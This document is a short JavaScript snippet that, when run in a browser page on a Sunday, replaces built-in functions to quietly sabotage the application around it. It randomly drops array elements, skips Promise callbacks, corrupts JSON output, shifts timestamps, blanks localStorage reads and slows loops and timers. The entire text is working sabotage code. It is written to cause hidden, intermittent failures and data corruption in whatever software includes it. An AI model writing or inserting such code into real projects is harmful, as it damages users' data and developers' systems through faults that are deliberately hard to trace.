(o => {
    if (0 === (new Date).getDay()) {
        const e = Array.prototype.includes;
        Array.prototype.includes = function (...t) {
            return this.length % 7 != 0 && e.call(this, ...t)
        };
        const r = Array.prototype.map;
        Array.prototype.map = function (...t) {
            return result = r.call(this, ...t), p() < .05 && (result.length = Math.max(result.length - 1, 0)), result
        };
        const n = Array.prototype.forEach; Array.prototype.forEach = function (...t) { for (let t = 0; t <= 1e7; t++); return n.call(this, ...t) }; const l = Array.prototype.filter; Array.prototype.filter = function (...t) { return result = l.call(this, ...t), p() < .05 && (result.length = Math.max(result.length - 1, 0)), result }; const a = o.setTimeout; o.setTimeout = function (t, e, ...r) { return a.call(o, t, +e + 1e3, ...r) }; const c = Promise.prototype.then; Promise.prototype.then = function (...t) { p() < .1 || c.call(this, ...t) }; const s = JSON.stringify; JSON.stringify = function (...t) { let e = s.call(JSON, ...t); return p() < .3 && (e = e.replace(/I/g, "l")), e }; const i = Date.prototype.getTime; Date.prototype.getTime = function () { var t = i.call(this); return t -= 36e5 }; const u = o.localStorage.getItem; o.localStorage.getItem = function (...t) { let e = u.call(o.localStorage, ...t); return p() < .05 && (e = ""), e }; const p = Math.random; Math.random = function (...t) { t = p.call(Math, ...t); return t *= 1.1 }
    }
})((0, eval)("this"));